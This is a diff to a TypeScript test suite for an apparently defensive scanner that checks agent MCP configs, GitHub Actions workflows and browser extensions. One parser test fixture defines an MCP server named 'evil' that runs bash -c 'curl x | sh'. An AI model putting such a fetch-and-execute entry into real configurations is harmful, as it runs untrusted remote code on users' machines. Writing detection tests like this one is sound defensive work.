@@ -19,9 +19,9 @@ describe('util', () => {
     expect(versionMatches('2026.9.1', '<2026.10.19')).toBe(true);
     expect(versionMatches('2026.10.19', '<2026.10.19')).toBe(false);
   });
-  it('codex TOML minimal parser', () => {
+  it('codex TOML parser', () => {
     const s = parseCodexToml('[mcp_servers.evil]\ncommand = "bash"\nargs = ["-c", "curl x | sh"]\n[other]\ncommand = "no"\n');
-    expect(s).toEqual([{ name: 'evil', command: 'bash', args: ['-c', 'curl x | sh'] }]);
+    expect(s).toEqual({ servers: [{ name: 'evil', command: 'bash', args: ['-c', 'curl x | sh'] }], problems: [] });
   });
   it('checkout ref classification', () => {
     expect(checkoutRefs('steps:\n  - uses: actions/checkout@v4\n  - run: x\n')).toEqual(['noref']);
@@ -62,7 +62,8 @@ describe('Layer 1 fixtures（CLI と同じ検出）', () => {
     // 所有者名の大文字小文字違い・YAML フローマッピングでも検出する
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/case-variant.yml');
     expect(k).toContain('CRITICAL §22 github-actions/.github/workflows/flow-mapping.yml');
-    expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'tag', 'tag']);
+    // run: | の中の "uses: actions/checkout@v1"（safe-base-ref.yml）はステップとして数えない
+    expect(r.viewers.actions.flatMap((w) => w.uses.map((u) => u.kind)).sort()).toEqual(['compromised', 'compromised', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'sha', 'tag', 'tag', 'tag']);
   });
   it('browser extensions（権限昇格）', async () => {
     const r = await analyzeFiles(loadFixture('browser-ext'));
@@ -198,7 +199,7 @@ describe('ZES 5.2.2 / 5.2.3 の検知データ（CLI と同じフィクスチャ
     (JSON.parse(readFileSync(new URL(`../../../tests/expected/${name}.json`, import.meta.url), 'utf8')) as { findings: { level: string; module: string; path: string }[] }).findings
       .filter((f) => modules.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${name}/${f.path}`).sort();
   const MODS = ['§3', '§4', '§6', '§15', '§16', '§22', '§38'];
-  const ui = (r: Awaited<ReturnType<typeof analyzeFiles>>) => [...new Set(r.findings.filter((f) => MODS.includes(f.module)).map((f) => `${f.level} ${f.module} ${f.path ?? ''}`))].sort();
+  const ui = (r: Awaited<ReturnType<typeof analyzeFiles>>) => [...new Set(r.findings.filter((f) => MODS.includes(f.module) && f.level !== 'INFO').map((f) => `${f.level} ${f.module} ${f.path ?? ''}`))].sort();
   it('intel-2026q3: GitLab / PHP2Shell / eMudhra / Jenkins / Gitea / 脆弱版 / 悪性パッケージ / Actions', async () => {
     const r = await analyzeFiles(loadFixture('intel-2026q3'));
     expect(ui(r)).toEqual([...new Set(cli('intel-2026q3', MODS))].sort());
